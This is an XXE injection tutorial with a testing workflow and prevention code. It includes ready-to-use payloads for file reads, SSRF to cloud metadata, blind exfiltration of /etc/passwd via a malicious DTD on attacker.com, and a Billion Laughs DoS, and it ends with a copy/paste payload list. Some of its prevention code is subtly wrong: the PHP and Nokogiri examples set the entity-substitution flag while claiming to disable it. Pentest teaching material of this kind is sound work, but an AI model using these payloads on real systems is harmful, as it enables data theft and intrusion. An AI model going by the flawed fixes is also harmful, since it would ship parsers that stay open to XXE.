# XML External Entity (XXE) injection

XXE occurs when an application parses XML input and the XML parser is configured to process external entity references. External entities let you define data that gets loaded from outside the XML document (local files, URLs, or other system resources). If user-controlled XML reaches a vulnerable parser, attackers can read files, trigger SSRF, perform DoS, and sometimes achieve RCE.

XXE is dangerous because the XML specification includes this feature by default in many parsers, and developers often don't realize their XML processing is exploitable.

> Only test systems you own or are explicitly authorized to assess.

## Why XXE is dangerous (trust model + XML specification)

XML parsers support Document Type Definitions (DTDs) which allow defining custom entities. External entities use the `SYSTEM` keyword to reference external resources:

```xml
<!ENTITY entityName SYSTEM "file:///etc/passwd">
```

When the parser encounters `&entityName;` in the document, it fetches and includes the file content.

The problem: most XML parsers enable this by default, and applications often parse user-supplied XML without restricting external entity processing.

Common vulnerable scenarios:
- APIs accepting XML payloads (SOAP, REST APIs with XML)
- File uploads containing XML (DOCX, XLSX, SVG, PPTX, ODT)
- XML-based configuration imports
- RSS/Atom feed parsers
- Content-Type switching (accepting XML when expecting form data)

## Attack types and exploitation patterns

### 1) Classic XXE (file disclosure with in-band response)
The application returns the entity value in the response, letting you read arbitrary files.

Original request:
```http
POST /api/stock HTTP/1.1
Host: target.tld
Content-Type: application/xml
Content-Length: 100

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>381</productId>
</stockCheck>
```

XXE payload (read /etc/passwd):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

Response:
```text
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Common files to test (Linux):
```text
file:///etc/passwd
file:///etc/shadow (requires root)
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///home/user/.ssh/id_rsa
file:///var/www/html/config.php
file:///var/log/apache2/access.log
```

Common files to test (Windows):
```text
file:///c:/windows/win.ini
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/inetpub/wwwroot/web.config
file:///c:/windows/system.ini
file:///c:/boot.ini
```

### 2) XXE for SSRF (internal network access)
Use external entities to make the server request internal/external URLs.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1/admin"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

Common SSRF targets via XXE:
```xml
<!ENTITY xxe SYSTEM "http://localhost/admin">
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/manager">
<!ENTITY xxe SYSTEM "http://192.168.1.5/api/internal">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
```

### 3) Blind XXE (out-of-band data exfiltration)
The application processes the XML but doesn't return entity values in the response. Use OOB techniques to exfiltrate data.

#### Blind XXE detection (DNS/HTTP callback):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

Check for DNS query or HTTP request to your domain.

#### Blind XXE data exfiltration (parameter entities + DTD chaining):
Host malicious DTD on your server (`http://attacker.com/evil.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

Payload sent to target:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<stockCheck>
  <productId>test</productId>
</stockCheck>
```

Flow:
1. Parser loads `evil.dtd` from attacker.com
2. `%file` reads `/etc/passwd`
3. `%eval` defines `%exfil` with the file content in the URL
4. `%exfil` triggers request to `http://attacker.com/?data=[file contents]`

### 4) Error-based blind XXE (data in error messages)
Force a parsing error that includes the file content.

Malicious DTD (`http://attacker.com/error.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser tries to load `file:///nonexistent/[contents of /etc/passwd]`, which fails and may include the path (with file data) in the error message.

### 5) XInclude attacks (when you don't control the whole document)
When the application embeds your input into a larger XML document (e.g., SOAP backend), you can't define a DOCTYPE. Use XInclude instead.

Original request:
```http
POST /api/process HTTP/1.1
Host: target.tld
Content-Type: application/x-www-form-urlencoded

data=test
```

XInclude payload:
```http
POST /api/process HTTP/1.1
Host: target.tld
Content-Type: application/x-www-form-urlencoded

data=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

The backend constructs XML like:
```xml
<soap:Envelope>
  <soap:Body>
    <data><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo></data>
  </soap:Body>
</soap:Envelope>
```

### 6) XXE via file upload (SVG, DOCX, XLSX, etc.)
Many file formats are XML-based. Upload a malicious file containing XXE payloads.

#### SVG example:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload this as `test.svg`. If the server processes it and renders/returns the image, the hostname may appear in the SVG.

#### DOCX example (document.xml inside the ZIP):
Extract a DOCX file, edit `word/document.xml`:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r><w:t>&xxe;</w:t></w:r>
    </w:p>
  </w:body>
</w:document>
```

Re-zip and upload. If the server parses the document, it may expose the file.

### 7) XXE via Content-Type switching
Some apps accept both form data and XML. Try changing `Content-Type` to `text/xml` or `application/xml`.

Original (form data):
```http
POST /api/action HTTP/1.1
Host: target.tld
Content-Type: application/x-www-form-urlencoded

foo=bar
```

Converted to XML:
```http
POST /api/action HTTP/1.1
Host: target.tld
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

If the backend parser is flexible, it may accept and process the XML.

### 8) Billion Laughs / XML bomb (DoS)
Recursive entity expansion to exhaust memory.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Expands to billions of "lol" strings, exhausting parser memory.

## Testing workflow (systematic XXE discovery)

### Step 1: Identify XML input points
- Look for `Content-Type: application/xml`, `text/xml`, `application/soap+xml`
- File upload features (test XML-based formats)
- APIs that might accept alternate formats
- Look for `.xml` in requests

### Step 2: Test for classic XXE (file read)
Insert DTD with external entity:
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
```

Reference entity in a field that gets returned:
```xml
<field>&xxe;</field>
```

### Step 3: Test all injectable fields
Try entity reference in every XML element/attribute:
```xml
<productId>&xxe;</productId>
<quantity>&xxe;</quantity>
<description>&xxe;</description>
```

### Step 4: Test for blind XXE (if no direct response)
Use OOB detection:
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://unique-id.burpcollaborator.net"> ]>
<field>&xxe;</field>
```

Check for DNS/HTTP callback.

### Step 5: Try XInclude (if DOCTYPE is blocked or you don't control root)
```xml
<field xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</field>
```

### Step 6: Test Content-Type switching
Change form data request to XML and see if it's processed.

### Step 7: Test file uploads
Upload SVG, DOCX, XLSX with XXE payloads.

## Protocol handlers (beyond file://)

Many parsers support multiple protocols:
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "http://internal.tld/admin">
<!ENTITY xxe SYSTEM "https://metadata/computeMetadata/v1/">
<!ENTITY xxe SYSTEM "ftp://internal.tld/file">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

PHP wrapper (PHP environments):
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

Returns base64-encoded file (useful for binary files or avoiding XML parsing errors).

## Prevention (how to fix XXE vulnerabilities)

The root cause is that XML parsers enable external entity processing by default. The fix is to disable it.

### Java (multiple parsers)

#### DocumentBuilderFactory:
```java
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Disable DOCTYPE declarations entirely
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// If you can't disable DOCTYPE, disable external entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

#### SAXParserFactory:
```java
import javax.xml.parsers.SAXParserFactory;

SAXParserFactory spf = SAXParserFactory.newInstance();

spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

#### XMLInputFactory (StAX):
```java
import javax.xml.stream.XMLInputFactory;

XMLInputFactory xif = XMLInputFactory.newFactory();

xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

### .NET

#### XmlDocument:
```csharp
XmlDocument xmlDoc = new XmlDocument();
xmlDoc.XmlResolver = null;  // Disable external entity resolution
xmlDoc.LoadXml(xmlString);
```

#### XmlReader:
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // Disable DTD processing
settings.XmlResolver = null;

using (XmlReader reader = XmlReader.Create(stream, settings))
{
    // Process XML
}
```

### PHP

#### libxml:
```php
libxml_disable_entity_loader(true);  // Disable external entity loading

$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
```

Better (modern PHP):
```php
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NONET);  // Disable network access
```

#### SimpleXML:
```php
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($xmlString, 'SimpleXMLElement', LIBXML_NONET);
```

### Python

#### lxml:
```python
from lxml import etree

parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.fromstring(xml_data, parser)
```

#### xml.etree.ElementTree (built-in):
```python
import xml.etree.ElementTree as ET

# ElementTree doesn't expand external entities by default in Python 3
tree = ET.fromstring(xml_data)
```

Avoid `xml.dom.minidom` and `xml.sax` in untrusted contexts unless explicitly secured.

### Node.js

#### libxmljs:
```javascript
const libxmljs = require('libxmljs');

const doc = libxmljs.parseXml(xmlString, {
  noent: false,   // Don't substitute entities
  nonet: true     // Disable network access
});
```

#### xml2js:
```javascript
const xml2js = require('xml2js');

const parser = new xml2js.Parser({
  explicitCharkey: true,
  trim: true
});
// xml2js doesn't process external entities by default
```

### Ruby

#### REXML:
```ruby
require 'rexml/document'

REXML::Document.entity_expansion_limit = 0  # Disable entity expansion

doc = REXML::Document.new(xml_string)
```

#### Nokogiri:
```ruby
require 'nokogiri'

doc = Nokogiri::XML(xml_string) do |config|
  config.nonet.noent  # Disable network and entity expansion
end
```

## Quick testing payloads (copy/paste)

Classic file read:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><field>&xxe;</field></root>
```

SSRF (cloud metadata):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root><field>&xxe;</field></root>
```

Blind XXE detection:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://unique-id.burpcollaborator.net"> ]>
<root><field>&xxe;</field></root>
```

XInclude:
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</root>
```

PHP filter (base64):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<root><field>&xxe;</field></root>
```
